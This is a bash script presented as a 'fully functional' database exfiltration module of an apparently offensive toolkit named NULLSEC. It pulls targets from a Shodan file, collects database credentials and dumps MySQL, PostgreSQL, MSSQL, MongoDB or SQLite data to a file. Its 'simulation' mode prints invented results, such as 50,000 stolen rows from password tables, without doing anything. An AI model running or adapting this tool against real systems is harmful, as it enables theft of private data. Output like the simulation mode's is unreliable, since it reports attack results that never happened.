#!/bin/bash
# NULLSEC Database Exfiltration - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC DATABASE EXFIL ▓▓▓${RESET}"
echo ""

echo -e "  ${YELLOW}Database type:${RESET}"
echo -e "    1) MySQL/MariaDB"
echo -e "    2) PostgreSQL"
echo -e "    3) MSSQL"
echo -e "    4) MongoDB"
echo -e "    5) SQLite"
read -p "$(echo -e ${WHITE}'  [>] Select [1-5]: '${RESET})" DB_TYPE
[ -z "$DB_TYPE" ] && DB_TYPE="1"

case $DB_TYPE in
    1|2|3)
        read -p "$(echo -e ${WHITE}'  [>] Host: '${RESET})" HOST
        [ -z "$HOST" ] && HOST="localhost"
        read -p "$(echo -e ${WHITE}'  [>] Port: '${RESET})" PORT
        [ -z "$PORT" ] && PORT="3306"
        read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USER
        [ -z "$USER" ] && USER="root"
        read -p "$(echo -e ${WHITE}'  [>] Password: '${RESET})" PASS
        read -p "$(echo -e ${WHITE}'  [>] Database: '${RESET})" DATABASE
        [ -z "$DATABASE" ] && DATABASE="users"
        ;;
    4)
        read -p "$(echo -e ${WHITE}'  [>] MongoDB URI: '${RESET})" MONGO_URI
        [ -z "$MONGO_URI" ] && MONGO_URI="mongodb://localhost:27017"
        ;;
    5)
        read -p "$(echo -e ${WHITE}'  [>] SQLite file: '${RESET})" SQLITE_FILE
        [ -z "$SQLITE_FILE" ] && SQLITE_FILE="database.db"
        ;;
esac

read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" OUTPUT
[ -z "$OUTPUT" ] && OUTPUT="dump.sql"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing database exfiltration"
    dbs=("MySQL" "PostgreSQL" "MSSQL" "MongoDB" "SQLite")
    echo -e "${DIM}[*] Connecting to ${dbs[$((DB_TYPE-1))]}...${RESET}"; sleep 0.4
    echo -e "${GREEN}[+]${RESET} Connected"
    echo -e "${DIM}[*] Enumerating tables...${RESET}"; sleep 0.3
    echo -e "${GREEN}[+]${RESET} Found: users, passwords, sessions, logs"
    echo -e "${DIM}[*] Dumping data...${RESET}"; sleep 0.6
    echo -e "${GREEN}[+]${RESET} Extracted 50000 rows"
    echo -e "${GREEN}[+]${RESET} Saved to: $OUTPUT"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live database exfiltration"
    
    case $DB_TYPE in
        1)
            if ! command -v mysqldump &> /dev/null; then
                echo -e "${RED}[!] mysqldump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install mysql-client${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] mysqldump -h $HOST -P $PORT -u $USER -p$PASS $DATABASE > $OUTPUT${RESET}"
            mysqldump -h $HOST -P $PORT -u $USER -p$PASS $DATABASE > $OUTPUT
            ;;
        2)
            if ! command -v pg_dump &> /dev/null; then
                echo -e "${RED}[!] pg_dump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install postgresql-client${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] PGPASSWORD=$PASS pg_dump -h $HOST -p $PORT -U $USER $DATABASE > $OUTPUT${RESET}"
            PGPASSWORD=$PASS pg_dump -h $HOST -p $PORT -U $USER $DATABASE > $OUTPUT
            ;;
        3)
            if ! command -v sqlcmd &> /dev/null; then
                echo -e "${RED}[!] sqlcmd not installed${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Executing MSSQL backup...${RESET}"
            sqlcmd -S $HOST,$PORT -U $USER -P $PASS -Q "BACKUP DATABASE $DATABASE TO DISK='$OUTPUT'"
            ;;
        4)
            if ! command -v mongodump &> /dev/null; then
                echo -e "${RED}[!] mongodump not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install mongodb-clients${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] mongodump --uri=$MONGO_URI --out=$OUTPUT${RESET}"
            mongodump --uri=$MONGO_URI --out=$OUTPUT
            ;;
        5)
            if ! command -v sqlite3 &> /dev/null; then
                echo -e "${RED}[!] sqlite3 not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install sqlite3${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] sqlite3 $SQLITE_FILE .dump > $OUTPUT${RESET}"
            sqlite3 $SQLITE_FILE .dump > $OUTPUT
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+]${RESET} Database dumped to: $OUTPUT"
        echo -e "${GREEN}[✓]${RESET} Complete"
    else
        echo -e "${RED}[!]${RESET} Exfiltration failed"
    fi
fi
echo ""
